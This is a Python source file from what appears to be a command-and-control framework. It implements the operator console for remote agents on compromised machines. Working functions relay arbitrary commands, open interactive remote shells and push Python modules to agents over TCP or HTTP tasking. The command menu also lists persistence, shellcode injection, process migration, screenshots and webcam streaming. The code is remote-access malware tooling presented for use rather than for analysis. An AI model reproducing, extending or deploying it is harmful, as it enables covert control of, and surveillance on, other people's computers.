from core.utils import common, config
from core.agents.utils import task as taskmng
from core.transport import tcp, http

from tabulate import tabulate
from pathlib import Path
import time

printer = common.Print_str()

AGENT_COMMANDS = {
    # === Session / Status ===
    "info": {
        "msg": "Show detailed system info of agent",
        "header": "SYSTEM INFO"
    },
    "tasks": {
        "msg": "Show all tasks of agent",
        "header": "TASKS"
    },
    "result": {
        "msg": "Show result of task ",
        "header": "TASKS"
    },
    # === Command Execution ===
    "cmd": {
        "msg": "Execute command on agent",
        "header": "CMD"
    },
    "shell": {
        "msg": "Stablish a shell on agent",
        "header": "SHELL"
    },
    "exec <file>": {
        "msg": "Execute uploaded binary",
        "header": "REMOTE EXECUTION"
    },

    # === Module Operations ===
    "module": {
        "msg": "Load and execute a module on agent",
        "header": "MODULE"
    },
    # === File Operations ===
    "download <file>": {
        "msg": "Download file from agent",
        "header": "FILE DOWNLOAD"
    },
    "upload <file>": {
        "msg": "Upload file to agent",
        "header": "FILE UPLOAD"
    },
    # === Lateral Movement / Persistence ===
    "persistence": {
        "msg": "Establish persistence on agent system",
        "header": "PERSISTENCE"
    },
    "inject <pid> <shellcode_file>": {
        "msg": "Inject shellcode into remote process",
        "header": "CODE INJECTION"
    },

    # === C2 / Agent Behavior ===
    "sleep <seconds>": {
        "msg": "Set agent sleep delay",
        "header": "SLEEP"
    },
    "migrate <pid>": {
        "msg": "Migrate to another process",
        "header": "PROCESS MIGRATION"
    },
    
    # === Misc ===
    "exit": {
        "msg": "Exit to previous menu ",
        "header": "HELP"
    },
    "help": {
        "msg": "Show this help message",
        "header": "HELP"
    }
}

MODULE_FOLDER = "core/modules"
MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
MODULE_LIST = {
    
    # === Recon ===
    "sysinfo": {
        "msg": "Extract system info",
        "header": "SYSINFO"
    },
    "screenshot": {
        "msg": "Take a screenshot of the desktop",
        "header": "SCREENSHOT"
    },
    "capture": {
        "msg": "Stream from webcam (if available)",
        "header": "WEBCAMCAPTURE"
    }
}

def tasks(agent_id):
    title = f"Agent {agent_id} tasks"
    headers = ["ID","Command", "Status", "Created At"]
    rows = []
    
    tasks = taskmng.get_all_tasks(agent_id)
    for task in tasks:
        rows.append([task.id, task.command, task.status, task.created_at])
        
    output = f"{title}\n{tabulate(rows, headers=headers, tablefmt='fancy_grid')}\n"
    return output

def result(agent_id, arg=None):
    headers = ["ID", "Command", "Result at", "Result"]
    rows = []

    if arg:
        if arg == "all":
            title = f"All results for Agent {agent_id}"
            
            tasks = taskmng.get_all_tasks(agent_id)
            if not tasks:
                return printer.warning(f"No tasks found for agent {agent_id}")
            
            for task in tasks:
                rows.append([task.id, task.command, task.result_at, task.result])
            output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
        elif arg == "raw":
            task = taskmng.get_earliest_result(agent_id)
            if not task:
                return printer.warning("No result has been sent yet")
            
            title = "Latest task result"
            output = task.result
        else:
            task = taskmng.get_task_by_id(agent_id, arg)
            if not task:
                return printer.warning(f"Task {arg} not found for agent {agent_id}")
            
            title = f"Task {task.id} result "
            headers = ["Command", "Result at", "Result"]
            rows.append([task.command, task.result_at, task.result])
            output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
    else:
        task = taskmng.get_earliest_result(agent_id)
        if not task:
            return printer.warning("No result has been sent yet")
        
        title = "Latest task result"
        rows.append([task.id, task.command, task.result_at, task.result])
        output = tabulate(rows, headers=headers, tablefmt='fancy_grid')
        
    return f"{title}\n{output}\n"


def cmd(agent, cmd, conn_type):
    header = AGENT_COMMANDS.get("cmd")["header"]
    if conn_type == "tcp":
        tcp.send_data(agent.conn, cmd, header)
        _, response = tcp.recv_data(agent.conn)
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, cmd, header)
        response = printer.success(f"Task {task_id} added")
    return response

def shell(conn, agent, conn_type):
    
    header = AGENT_COMMANDS.get("shell")["header"]
    tcp.send_data(conn, f"{printer.task("Stablishing shell...")}{printer.success("Shell stablished")}", header)
    tcp.send_data(conn, "SHELL", header)
    
    if conn_type =="tcp":
        tcp.send_data(agent.conn, " ", header)
        
        while True:
            _, cmd = tcp.recv_data(conn)
            if cmd == "exit":
                tcp.send_data(agent.conn, cmd)
                _, response = tcp.recv_data(agent.conn)
                break
            tcp.send_data(agent.conn, cmd)
            _, response = tcp.recv_data(agent.conn)
            tcp.send_data(conn, response)
            
    elif conn_type == "http":
        taskmng.add_task(agent.id, "", header)
        while True:
            response = None
            
            _, cmd = tcp.recv_data(conn)
            if cmd == "exit":
                task_id = taskmng.add_task(agent.id, cmd)
                counter = 0
                while counter != 10:
                    task = taskmng.get_task_by_id(agent.id, task_id)
                    response = task.result.strip("\n")

                    if response:
                        break
                    time.sleep(1)
                    counter += 1
                    
                break
            else:
                task_id = taskmng.add_task(agent.id, cmd)
                while not response:
                    task = taskmng.get_task_by_id(agent.id, task_id)
                    response = task.result
                tcp.send_data(conn, response)
            
    return f"{printer.task("Closing shell...")}{printer.success(response)}"


def module(agent, arg, conn_type):
    if not arg:
        return module_help()
    global MODULE_FILES
    
    if not MODULE_FILES:
        return printer.warning("No module available")
    
    MODULE_FILES = [f.stem for f in Path(MODULE_FOLDER).iterdir() if f.is_file() and f.suffix == ".py"]
    
    if arg == "list":
        lines = ["Available Commands:\n"]
        
        for cmd, info in AGENT_COMMANDS.items():
            if cmd in MODULE_FILES:
                msg = info["msg"] if isinstance(info, dict) else info
                lines.append(f"  - {cmd:<20} {msg}")
                
        return printer.info("\n".join(lines))

    module_name = arg

    if not module_name in MODULE_FILES:
        return printer.warning("Module not found")
    
    with open(f"{MODULE_FOLDER}/{module_name}.py","r") as f:
        module = f.read()

    header = AGENT_COMMANDS.get("module")["header"]
    
    if conn_type == "tcp":
        tcp.send_data(agent.conn, module, header)
        _, response = tcp.recv_data(agent.conn)
        
    elif conn_type == "http":
        task_id = taskmng.add_task(agent.id, module_name, header)
        response = printer.success(f"Task {task_id} added")

    return response

def exit():
    return printer.signal("Main Menu")

# Helps

def help():
    help_lines = ["Available Commands:\n"]

    for cmd, info in AGENT_COMMANDS.items():
        msg = info["msg"] if isinstance(info, dict) else info
        help_lines.append(f"  - {cmd:<20} {msg}")
        
    return printer.info("\n".join(help_lines))

def cmd_help():
    return printer.info("Usage: cmd <command>")

def module_help():
    return printer.info("Usage: module <name> | list")